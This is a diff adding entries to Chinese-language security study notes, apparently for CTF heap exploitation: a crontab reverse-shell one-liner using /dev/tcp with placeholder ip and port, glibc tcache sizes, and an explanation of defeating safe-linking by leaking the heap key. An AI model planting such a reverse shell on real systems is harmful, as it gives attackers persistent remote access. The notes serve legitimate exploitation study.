@@ -105,9 +105,126 @@ AX = AH + AL
 
 
 
+# 0x07 crontab反弹shell
+
+`* * * * * bash -c "bash -i >& /dev/tcp/ip/port 1>&0"`
+
+crontab常用命令
+
+`crontab -l` 列出当前定时任务
+
+`crontab -e` 编辑定时任务
+
+`crontab file` 从文件中读取定时任务
 
 
 
+# 0x08 tcache和largebin大小
+
+64位下 tcache最大放0x410的chunk，largebin从0x400开始
 
 
 
+# 0x09 safe-linking加解密与bypass
+
+##加密
+
+![image-20220930000628640](/assets/img/2022/image-20220930000628640.png)
+
+- P为指针本身（也就是原先的fd/next值）， L为指针的地址
+  - L >> 12 可以看成是key
+  - 也就是原先的fd值 去异或一个 key，得到新的fd值
+
+验证下加密过程：
+
+![image-20220930001151219](/assets/img/2022/image-20220930001151219.png)
+
+图为fastbin链，`chunk2 -> chunk1` ，chunk2原先的fd是chunk1的header=0x555555756510， 现在的加密后的fd是0x0000555000203246
+
+手动计算验证一下：P为原先的fd=0x555555756510，L为指针的地址=0x555555756570
+
+`P' =(0x555555756570 >> 12) ^ 0x555555756510 =0x555000203246  ` ，和图上的一样
+
+
+
+##解密
+
+众所周知，异或操作是可逆的
+
+称`L >> 12`为**KEY**
+
+`P' = KEY ^ P`
+
+`P' ^ KEY = (KEY ^ P) ^ KEY = 0 ^ P = P`
+
+也就是说只要把加密后的fd，再异或个`L >> 12` 也就是原先的fd了
+
+
+
+##解密的关键
+
+所以说leak出 `L>>12` 是关键
+
+然后你会发现fastbin/tcache的尾节点（意思 `tcache -> chunk3 -> chunk2 -> chunk1`中的chunk1）
+
+它原先的fd是0
+
+根据公式`P' = KEY ^ P`，而P是0， 所以`P'=KEY`，意思尾节点chunk的fd中记录着的就是KEY
+
+只要leak它就能拿到KEY，然后这个加解密就形同虚设了
+
+当然不一定要leak这个KEY，直接leak出堆地址也是可以的，把堆地址右移12也是一样的。
+
+**总结一下解密的关键：**
+
+- L>>12
+- 堆地址
+
+
+
+## 利用
+
+把伪造的fd 和 KEY 异或一下，填入就可以
+
+
+
+## bypass
+
+待补充
+
+https://www.anquanke.com/post/id/206457
+
+https://www.anquanke.com/post/id/207770
+
+**Ref.**
+
+https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/
+
+https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation
+
+https://www.anquanke.com/post/id/206457
+
+https://www.anquanke.com/post/id/207770
+
+
+
+# 0x10 glibc 2.32引入的变化
+
+- 引入了safe-linking
+
+- 引入了对tcache和fastbins中申请及释放内存地址的对齐检测，内存地址需要以0x10字节对齐
+  - http://blog.nsfocus.net/glibc-234/
+
+修复了
+
+- 原有tcache poisoning、fastbin attack等通过直接覆盖chunk->next指针达到任意地址申请的利用方法
+
+- 由于检测了申请地址是否以0x10对齐，fastbin attack的利用办法受到限制，例如经典的通过错位构造”\x7f”劫持malloc_hook和IO_FILE的利用办法。
+
+待补充
+
+http://blog.nsfocus.net/glibc-234/
+
+**Ref.**
+
+https://medium.com/@b3rm1nG/%E8%81%8A%E8%81%8Aglibc-2-32-malloc%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6-safe-linking-9fb763466773
